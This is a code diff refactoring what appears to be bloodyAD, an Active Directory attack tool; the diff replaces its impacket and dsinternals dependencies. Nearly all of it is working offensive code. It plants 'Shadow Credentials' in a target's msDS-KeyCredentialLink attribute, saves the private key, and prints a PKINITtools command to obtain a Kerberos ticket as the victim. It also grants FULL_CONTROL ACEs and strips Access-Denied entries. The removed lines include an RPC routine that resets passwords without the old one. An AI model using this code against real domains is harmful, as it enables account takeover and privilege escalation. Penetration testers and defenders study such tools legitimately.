@@ -1,76 +1,19 @@
-import random
-import string
-import ldap3
-import impacket
-import logging
-import json
-import sys
-from ldap3.protocol.formatters.formatters import format_sid
-from bloodyAD.formatters import decodeAce
-from impacket.ldap import ldaptypes
-from impacket.dcerpc.v5 import samr, dtypes
-from dsinternals.system.Guid import Guid
-from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
-from dsinternals.system.DateTime import DateTime
-from dsinternals.common.data.hello.KeyCredential import KeyCredential
-from dsinternals.common.data import DNWithBinary
-
+from bloodyAD.formatters import ldaptypes, accesscontrol, cryptography, common
 from bloodyAD.exceptions import NoResultError, ResultError, TooManyResultsError
-from bloodyAD.formatters import ACCESS_FLAGS, ACE_FLAGS
+import random, string, logging, json, sys, datetime, binascii
+import ldap3
+from ldap3.protocol.formatters.formatters import format_sid
+from cryptography import x509
+from cryptography.x509.oid import NameOID
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+
 
 LOG = logging.getLogger("bloodyAD")
 LOG.setLevel(logging.DEBUG)
 handler = logging.StreamHandler(sys.stdout)
 handler.setLevel(logging.DEBUG)
 LOG.addHandler(handler)
-
-
-def createACE(sid, object_type=None, access_mask=ACCESS_FLAGS["FULL_CONTROL"]):
-    nace = ldaptypes.ACE()
-    nace["AceFlags"] = (
-        ACE_FLAGS["CONTAINER_INHERIT_ACE"] + ACE_FLAGS["OBJECT_INHERIT_ACE"]
-    )
-
-    if object_type is None:
-        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
-        nace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
-    else:
-        nace["AceType"] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
-        acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
-        acedata["ObjectType"] = impacket.uuid.string_to_bin(object_type)
-        acedata["InheritedObjectType"] = b""
-        acedata["Flags"] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
-
-    acedata["Mask"] = ldaptypes.ACCESS_MASK()
-    acedata["Mask"]["Mask"] = access_mask
-
-    if type(sid) is str:
-        acedata["Sid"] = ldaptypes.LDAP_SID()
-        acedata["Sid"].fromCanonical(sid)
-    else:
-        acedata["Sid"] = sid
-
-    nace["Ace"] = acedata
-    return nace
-
-
-def createEmptySD():
-    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
-    sd["Revision"] = b"\x01"
-    sd["Sbz1"] = b"\x00"
-    sd["Control"] = 32772
-    sd["OwnerSid"] = ldaptypes.LDAP_SID()
-    # BUILTIN\Administrators
-    sd["OwnerSid"].fromCanonical("S-1-5-32-544")
-    sd["GroupSid"] = b""
-    sd["Sacl"] = b""
-    acl = ldaptypes.ACL()
-    acl["AclRevision"] = 4
-    acl["Sbz1"] = 0
-    acl["Sbz2"] = 0
-    acl.aces = []
-    sd["Dacl"] = acl
-    return sd
 
 
 def resolvDN(conn, identity, objtype=None):
@@ -121,7 +64,7 @@ def search(
     ldap_filter="(objectClass=*)",
     search_scope=ldap3.BASE,
     attr=["*"],
-    control_flag=dtypes.OWNER_SECURITY_INFORMATION,
+    control_flag=accesscontrol.OWNER_SECURITY_INFORMATION,
 ):
     ldap_conn = conn.getLdapConnection()
     base_dn = resolvDN(ldap_conn, base)
@@ -145,7 +88,7 @@ def setAttr(
     identity,
     attribute,
     value,
-    control_flag=dtypes.OWNER_SECURITY_INFORMATION,
+    control_flag=accesscontrol.OWNER_SECURITY_INFORMATION,
 ):
     ldap_conn = conn.getLdapConnection()
     dn = resolvDN(ldap_conn, identity)
@@ -184,73 +127,11 @@ def getObjectSID(conn, identity):
     return object_sid
 
 
-def cryptPassword(session_key, password):
-    try:
-        from Cryptodome.Cipher import ARC4
-    except Exception:
-        LOG.error(
-            "Warning: You don't have any crypto installed. You need pycryptodomex"
-        )
-        LOG.error("See https://pypi.org/project/pycryptodomex/")
-
-    sam_user_pass = samr.SAMPR_USER_PASSWORD()
-    encoded_pass = password.encode("utf-16le")
-    plen = len(encoded_pass)
-    sam_user_pass["Buffer"] = b"A" * (512 - plen) + encoded_pass
-    sam_user_pass["Length"] = plen
-    pwdBuff = sam_user_pass.getData()
-
-    rc4 = ARC4.new(session_key)
-    encBuf = rc4.encrypt(pwdBuff)
-
-    sam_user_pass_enc = samr.SAMPR_ENCRYPTED_USER_PASSWORD()
-    sam_user_pass_enc["Buffer"] = encBuf
-    return sam_user_pass_enc
-
-
-def rpcChangePassword(conn, target, new_pass):
-    """
-    Change the target password without knowing the old one using RPC instead of LDAPS
-    Args:
-        domain for NTLM authentication
-        NTLM username of the user with permissions on the target
-        NTLM password or hash of the user
-        IP or hostname of the DC to make the password change
-        sAMAccountName of the target
-        new password for the target
-    """
-    dce = conn.getSamrConnection()
-    server_handle = samr.hSamrConnect(dce, conn.conf.host + "\x00")["ServerHandle"]
-    domainSID = samr.hSamrLookupDomainInSamServer(dce, server_handle, conn.conf.domain)[
-        "DomainId"
-    ]
-    domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domainSID)[
-        "DomainHandle"
-    ]
-    userRID = samr.hSamrLookupNamesInDomain(dce, domain_handle, (target,))[
-        "RelativeIds"
-    ]["Element"][0]
-    opened_user = samr.hSamrOpenUser(dce, domain_handle, userId=userRID)
-
-    req = samr.SamrSetInformationUser2()
-    req["UserHandle"] = opened_user["UserHandle"]
-    req["UserInformationClass"] = samr.USER_INFORMATION_CLASS.UserInternal5Information
-    req["Buffer"] = samr.SAMPR_USER_INFO_BUFFER()
-    req["Buffer"]["tag"] = samr.USER_INFORMATION_CLASS.UserInternal5Information
-    req["Buffer"]["Internal5"]["UserPassword"] = cryptPassword(
-        b"SystemLibraryDTC", new_pass
-    )
-    req["Buffer"]["Internal5"]["PasswordExpired"] = 0
-
-    resp = dce.request(req)
-    return resp
-
-
 def getSD(
     conn,
     object_id,
     ldap_attribute="nTSecurityDescriptor",
-    control_flag=dtypes.DACL_SECURITY_INFORMATION,
+    control_flag=accesscontrol.DACL_SECURITY_INFORMATION,
 ):
     entry = search(conn, object_id, attr=ldap_attribute, control_flag=control_flag)[0]
     sd_data = entry["raw_attributes"][ldap_attribute]
@@ -258,18 +139,23 @@ def getSD(
         LOG.warning(
             "[!] No security descriptor has been returned, a new one will be created"
         )
-        sd = createEmptySD()
+        sd = accesscontrol.createEmptySD()
     else:
         sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])
 
     return sd, sd_data
 
 
-def addRight(sd, user_sid, access_mask=ACCESS_FLAGS["FULL_CONTROL"], object_type=None):
+def addRight(
+    sd,
+    user_sid,
+    access_mask=accesscontrol.ACCESS_FLAGS["FULL_CONTROL"],
+    object_type=None,
+):
     user_aces = [
         ace for ace in sd["Dacl"].aces if ace["Ace"]["Sid"].getData() == user_sid
     ]
-    new_ace = createACE(user_sid, object_type, access_mask)
+    new_ace = accesscontrol.createACE(user_sid, object_type, access_mask)
     if object_type:
         access_denied_type = ldaptypes.ACCESS_DENIED_OBJECT_ACE.ACE_TYPE
     else:
@@ -284,7 +170,7 @@ def addRight(sd, user_sid, access_mask=ACCESS_FLAGS["FULL_CONTROL"], object_type
         if ace["AceType"] == access_denied_type and new_mask.hasPriv(mask["Mask"]):
             sd["Dacl"].aces.remove(ace)
             LOG.debug("[-] An interfering Access-Denied ACE has been removed:")
-            LOG.info(json.dumps(decodeAce(ace)))
+            LOG.info(json.dumps(accesscontrol.decodeAce(ace)))
         # Adds ACE if not already added
         elif mask.hasPriv(new_mask["Mask"]):
             hasPriv = True
@@ -299,7 +185,12 @@ def addRight(sd, user_sid, access_mask=ACCESS_FLAGS["FULL_CONTROL"], object_type
     return isAdded
 
 
-def delRight(sd, user_sid, access_mask=ACCESS_FLAGS["FULL_CONTROL"], object_type=None):
+def delRight(
+    sd,
+    user_sid,
+    access_mask=accesscontrol.ACCESS_FLAGS["FULL_CONTROL"],
+    object_type=None,
+):
     isRemoved = False
     user_aces = [
         ace for ace in sd["Dacl"].aces if ace["Ace"]["Sid"].getData() == user_sid
@@ -334,24 +225,34 @@ def addShadowCredentials(conn, identity, outfilePath=None):
     target_dn = resolvDN(ldap_conn, identity)
 
     LOG.debug("Generating certificate")
-    certificate = X509Certificate2(
-        subject=identity,
-        keySize=2048,
-        notBefore=(-40 * 365),
-        notAfter=(40 * 365),
+
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    subject = issuer = x509.Name(
+        [
+            x509.NameAttribute(NameOID.COMMON_NAME, target_dn),
+        ]
     )
+    cert = (
+        x509.CertificateBuilder()
+        .subject_name(issuer)
+        .issuer_name(issuer)
+        .serial_number(x509.random_serial_number())
+        .public_key(key.public_key())
+        .not_valid_before(datetime.datetime.utcnow())
+        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
+        .sign(key, hashes.SHA256())
+    )
+
     LOG.debug("Certificate generated")
     LOG.debug("Generating KeyCredential")
-    keyCredential = KeyCredential.fromX509Certificate2(
-        certificate=certificate,
-        deviceId=Guid(),
-        owner=target_dn,
-        currentTime=DateTime(),
+
+    keyCredential = cryptography.KEYCREDENTIALLINK_BLOB()
+    keyCredential.keyCredentialLink_from_x509(cert)
+
+    LOG.info(
+        "[+] KeyCredential generated with following sha256 of RSA key: %s"
+        % binascii.hexlify(keyCredential.getKeyID()).decode()
     )
-    LOG.debug(
-        "KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD()
-    )
-    LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
 
     ldap_conn.search(
         target_dn,
@@ -360,17 +261,21 @@ def addShadowCredentials(conn, identity, outfilePath=None):
         attributes=["msDS-KeyCredentialLink"],
     )
 
+    key_dnbinary = common.DNBinary()
+    key_dnbinary.fromCanonical(keyCredential.getData(), target_dn)
     new_values = ldap_conn.response[0]["raw_attributes"]["msDS-KeyCredentialLink"] + [
-        keyCredential.toDNWithBinary().toString()
+        str(key_dnbinary)
     ]
-    LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % identity)
+
+    LOG.debug("[*] Updating the msDS-KeyCredentialLink attribute of %s" % identity)
+
     ldap_conn.modify(
         target_dn,
         {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, new_values]},
     )
 
     if ldap_conn.result["result"] == 0:
-        LOG.debug("msDS-KeyCredentialLink attribute of the target object updated")
+        LOG.debug("[+] msDS-KeyCredentialLink attribute of the target object updated")
         if outfilePath is None:
             path = "".join(
                 random.choice(string.ascii_letters + string.digits) for i in range(8)
@@ -382,24 +287,36 @@ def addShadowCredentials(conn, identity, outfilePath=None):
         else:
             path = outfilePath
 
-        certificate.ExportPEM(path_to_files=path)
-        LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
-        LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
+        key_path = path + "_priv.pem"
+        with open(key_path, "wb") as f:
+            f.write(
+                key.private_bytes(
+                    serialization.Encoding.PEM,
+                    serialization.PrivateFormat.TraditionalOpenSSL,
+                    serialization.NoEncryption(),
+                )
+            )
+        cert_path = path + "_cert.pem"
+        with open(cert_path, "wb") as f:
+            f.write(cert.public_bytes(serialization.Encoding.PEM))
+
+        LOG.info("[+] Saved PEM certificate at path: %s" % cert_path)
+        LOG.info("[+] Saved PEM private key at path: %s" % key_path)
         LOG.info(
             "A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools"
         )
         LOG.info("Run the following command to obtain a TGT:")
         LOG.info(
-            "python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem"
-            " -key-pem %s_priv.pem %s/%s %s.ccache"
-            % (path, path, conn.conf.domain, identity, path)
+            "python3 PKINITtools/gettgtpkinit.py -cert-pem %s"
+            " -key-pem %s %s/%s %s.ccache"
+            % (cert_path, key_path, conn.conf.domain, identity, path)
         )
 
     else:
         raise ResultError(ldap_conn.result)
 
 
-def delShadowCredentials(conn, identity, deviceID):
+def delShadowCredentials(conn, identity, rsakey_sha256):
     """
     Delete the crafted certificate (Shadow Credentials) from the msDS-KeyCredentialLink attribute of the user provided
     Args:
@@ -408,14 +325,17 @@ def delShadowCredentials(conn, identity, deviceID):
     attr = "msDS-KeyCredentialLink"
     keyCreds = search(conn, identity, attr=attr)[0]["raw_attributes"][attr]
     newKeyCreds = []
+    isFound = False
     for keyCred in keyCreds:
-        dnBin = DNWithBinary.DNWithBinary.fromRawDNWithBinary(keyCred)
-        if (
-            deviceID
-            and KeyCredential.fromDNWithBinary(dnBin).DeviceId.toFormatD() != deviceID
-        ):
+        key_raw = common.DNBinary(keyCred).value
+        key_blob = cryptography.KEYCREDENTIALLINK_BLOB(key_raw)
+        if rsakey_sha256 and key_blob.getKeyID() != binascii.unhexlify(rsakey_sha256):
             newKeyCreds.append(keyCred)
         else:
+            isFound = True
             LOG.debug("[*] Key to delete found")
+
+    if not isFound:
+        LOG.warning("[!] No key found")
 
     setAttr(conn, identity, attr, newKeyCreds)
